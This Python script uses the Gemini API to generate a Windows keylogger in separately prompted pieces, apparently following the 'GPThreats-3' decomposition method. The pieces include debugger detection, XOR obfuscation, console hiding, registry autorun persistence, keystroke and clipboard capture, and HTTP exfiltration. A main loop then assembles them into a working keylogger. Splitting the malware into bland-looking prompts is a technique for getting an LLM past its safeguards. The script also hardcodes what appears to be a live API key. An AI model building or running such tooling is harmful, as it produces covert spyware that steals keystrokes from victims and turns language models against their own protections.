#!/usr/bin/env python3
"""
Gemini-Based Automated Keylogger Building Block Generator
Modified from GPThreats-3 Paper Methodology to use Google Gemini API
For Educational/Research Purposes Only
"""

import google.generativeai as genai
import time
import subprocess
import os
import shutil

# Configuration
GEMINI_API_KEY = "AIzaSyDL4D_kR0_Tlyx42EMgrZxbYXchHwRjRLo"  # Replace with your Gemini API key
MODEL = "gemini-2.5-flash"  # or "gemini-1.5-flash" for faster responses
MAX_ATTEMPTS = 5
COMPILER = "gcc"  # or "cl" for Visual Studio

# Building block definitions
BUILDING_BLOCKS = [
    {
        "name": "Debugger Detection",
        "prototype": "BOOL CheckDebugger()",
        "description": "Check if a debugger is attached to the process",
        "expected_apis": ["IsDebuggerPresent"],
    },
    {
        "name": "XOR String Encoding",
        "prototype": "void XORString(char* data, int length, char key)",
        "description": "Encode a string using XOR with a key",
        "expected_apis": [],
    },
    {
        "name": "Timestamp Generation",
        "prototype": "void GetCurrentTimestamp(char* buffer, int size)",
        "description": "Get current system time as formatted string",
        "expected_apis": ["GetLocalTime"],
    },
    {
        "name": "Active Window Title",
        "prototype": "void GetActiveWindowTitle(char* buffer, int size)",
        "description": "Get the title of the currently focused window",
        "expected_apis": ["GetForegroundWindow", "GetWindowText"],
    },
    {
        "name": "File Writing",
        "prototype": "BOOL WriteToLog(const char* data, const char* filename)",
        "description": "Append data to a log file",
        "expected_apis": ["CreateFile", "WriteFile", "CloseHandle"],
    },
    {
        "name": "Virtual Key Translation",
        "prototype": "char TranslateVirtualKey(int vKey, BOOL shifted)",
        "description": "Convert virtual key code to ASCII character",
        "expected_apis": ["MapVirtualKey", "ToAscii"],
    },
    {
        "name": "Keyboard State Polling",
        "prototype": "BOOL CheckKeyState(int vKey)",
        "description": "Check if a key is currently pressed",
        "expected_apis": ["GetAsyncKeyState"],
    },
    {
        "name": "Clipboard Monitoring",
        "prototype": "void GetClipboardContent(char* buffer, int size)",
        "description": "Retrieve current clipboard text",
        "expected_apis": ["OpenClipboard", "GetClipboardData", "CloseClipboard"],
    },
    {
        "name": "Process Hiding",
        "prototype": "void HideConsoleWindow()",
        "description": "Hide the console window from the user",
        "expected_apis": ["GetConsoleWindow", "ShowWindow"],
    },
    {
        "name": "AutoRun Persistence",
        "prototype": "BOOL SetAutoRun(const char* exePath)",
        "description": "Set registry key for automatic startup",
        "expected_apis": ["RegOpenKeyEx", "RegSetValueEx", "RegCloseKey"],
    },
    {
        "name": "Network Exfiltration",
        "prototype": "BOOL SendDataToServer(const char* data, const char* serverUrl)",
        "description": "Send data to remote server via HTTP POST",
        "expected_apis": ["InternetOpen", "InternetOpenUrl", "HttpSendRequest"],
    },
]


def create_gemini_prompt(block):
    """Create a prompt for Gemini to generate a building block"""
    prompt = f"""Code in C
Code for Windows
Use the Windows API
Write a function
Function prototype is {block['prototype']}
{block['description']}

Generate only the function implementation. Include necessary headers.
Make sure the code compiles with gcc or Visual Studio.
"""
    return prompt


def query_gemini(prompt, previous_attempts=None):
    """Query Gemini with the given prompt"""
    genai.configure(api_key=GEMINI_API_KEY)

    # Initialize the model
    model = genai.GenerativeModel(
        model_name=MODEL,
        generation_config={
            "temperature": 0.7,
            "max_output_tokens": 2048,
            "top_p": 0.95,
        },
        system_instruction="You are an expert C programmer specializing in Windows API programming."
    )

    # If there were previous attempts, append them to avoid duplicates
    if previous_attempts:
        prompt += "\n\nDo not generate the following (already tried):\n"
        for attempt in previous_attempts:
            prompt += f"---\n{attempt}\n"

    try:
        response = model.generate_content(prompt)

        # Extract code from response
        code = response.text.strip()

        # Remove markdown code blocks if present
        if "```c" in code:
            # Extract code between ```c and ```
            start = code.find("```c") + 4
            end = code.find("```", start)
            code = code[start:end].strip()
        elif "```" in code:
            # Generic code block
            start = code.find("```") + 3
            end = code.find("```", start)
            code = code[start:end].strip()

        return code

    except Exception as e:
        print(f"Error querying Gemini: {e}")
        return None


def apply_systematic_fixes(code):
    """Apply systematic error fixes as described in the paper"""
    fixes = []

    # Add missing headers
    if "#include" not in code:
        code = "#include <windows.h>\n#include <stdio.h>\n\n" + code
        fixes.append("Added missing headers")

    # Fix ASCII/UNICODE issues (convert to A versions)
    replacements = {
        "CreateFileW": "CreateFileA",
        "GetWindowTextW": "GetWindowTextA",
        "RegOpenKeyExW": "RegOpenKeyExA",
        "RegSetValueExW": "RegSetValueExA",
        "InternetOpenW": "InternetOpenA",
        "InternetOpenUrlW": "InternetOpenUrlA",
    }

    for old, new in replacements.items():
        if old in code:
            code = code.replace(old, new)
            fixes.append(f"Fixed {old} -> {new}")

    # Fix cout to printf
    if "cout" in code or "std::" in code:
        code = code.replace("#include <iostream>", "#include <stdio.h>")
        fixes.append("Converted C++ to C")

    if fixes:
        print(f"  Applied fixes: {', '.join(fixes)}")

    return code


def compile_code(code, output_name):
    """Attempt to compile the generated code"""
    temp_file = f"temp_{output_name}.c"
    with open(temp_file, 'w') as f:
        f.write(code)
        f.flush()

    print(f"Compiling: {os.path.abspath(temp_file)}")

    try:
        if COMPILER == "gcc":
            # Source your shell config first, then run command
            cmd = cmd = f"bash -l -c 'x86_64-w64-mingw32-gcc -c {temp_file} -o {output_name}.o -Wall -Wextra -Werror -std=c99 -Wno-implicit-function-declaration -Wno-incompatible-pointer-types'"


            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,
                executable='/bin/bash'
            )
        else:
            cmd = f"cl /c {temp_file} /Fo{output_name}.obj"
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )

        if result.returncode == 0:
            print(f"  ✓ Compilation successful")
            return True, None
        else:
            print(f"  ✗ Compilation failed")
            print(f"  stderr: {result.stderr}")
            return False, result.stderr

    except Exception as e:
        print(f"  ✗ Compilation error: {e}")
        return False, str(e)
    finally:
        if os.path.exists(temp_file):
            os.remove(temp_file)


def generate_building_block(block):
    """Generate a single building block using Gemini"""
    print(f"\nGenerating: {block['name']}")
    print(f"Prototype: {block['prototype']}")

    previous_attempts = []

    for attempt in range(1, MAX_ATTEMPTS + 1):
        print(f"  Attempt {attempt}/{MAX_ATTEMPTS}...")

        # Query Gemini
        prompt = create_gemini_prompt(block)
        code = query_gemini(prompt, previous_attempts if attempt > 1 else None)

        if not code:
            continue

        # Apply systematic fixes
        code = apply_systematic_fixes(code)

        # Try to compile
        success, error = compile_code(code, block['name'].replace(' ', '_'))

        if success:
            print(f"  ✓ Building block generated successfully!")
            return code

        # Store failed attempt
        previous_attempts.append(code)

        # Wait a bit before next attempt (API rate limiting)
        time.sleep(1)

    print(f"  ✗ Failed to generate after {MAX_ATTEMPTS} attempts")
    return None


def generate_keylogger_skeleton(building_blocks):
    """Generate the main keylogger skeleton that uses all building blocks"""
    skeleton = """
#include <windows.h>
#include <stdio.h>

// Building block prototypes
"""

    # Add all function prototypes
    for block in building_blocks:
        if block['code']:
            skeleton += f"{block['prototype']};\n"

    skeleton += """

// Main keylogger logic
int main(int argc, char* argv[]) {
    // Anti-Analysis
    if (CheckDebugger()) {
        return 1;
    }

    // Stealth
    HideConsoleWindow();

    // Persistence
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    SetAutoRun(exePath);

    // Main loop
    while (1) {
        // Keyboard polling logic
        for (int vKey = 0x08; vKey <= 0xFE; vKey++) {
            if (CheckKeyState(vKey)) {
                char c = TranslateVirtualKey(vKey, GetAsyncKeyState(VK_SHIFT) & 0x8000);
                if (c != 0) {
                    char buffer[256];
                    sprintf(buffer, "%c", c);
                    WriteToLog(buffer, "log.txt");
                }
            }
        }

        Sleep(10);
    }

    return 0;
}
"""

    return skeleton


def main():
    """Main automation script"""
    print("=" * 70)
    print("Gemini-Based Automated Keylogger Building Block Generator")
    print("Based on GPThreats-3 Paper Methodology")
    print("=" * 70)

    if GEMINI_API_KEY == "your-api-key-here":
        print("\n⚠ WARNING: Please set your Gemini API key first!")
        print("Edit the GEMINI_API_KEY variable at the top of this script.")
        print("\nGet your API key from: https://makersuite.google.com/app/apikey")
        return

    start_time = time.time()
    results = []

    # Generate each building block
    for block in BUILDING_BLOCKS:
        code = generate_building_block(block)
        results.append({
            'name': block['name'],
            'prototype': block['prototype'],
            'code': code,
            'success': code is not None
        })

    # Statistics
    elapsed_time = time.time() - start_time
    successful = sum(1 for r in results if r['success'])

    print("\n" + "=" * 70)
    print("GENERATION COMPLETE")
    print("=" * 70)
    print(f"Time elapsed: {elapsed_time:.1f} seconds")
    print(f"Successful: {successful}/{len(BUILDING_BLOCKS)} building blocks")
    print(f"Success rate: {successful/len(BUILDING_BLOCKS)*100:.1f}%")

    # Save all successful code
    output_file = "generated_keylogger_gemini.c"
    with open(output_file, 'w') as f:
        f.write("// Auto-generated by Google Gemini\n")
        f.write("// Building Blocks Approach\n\n")

        for result in results:
            if result['success']:
                f.write(f"// {result['name']}\n")
                f.write(result['code'])
                f.write("\n\n")

        # Add skeleton
        f.write(generate_keylogger_skeleton(results))

    print(f"\nGenerated code saved to: {output_file}")
    print("\n⚠ WARNING: This is for educational/research purposes only!")
    print("Unauthorized use of keyloggers is illegal.")


if __name__ == "__main__":
    main()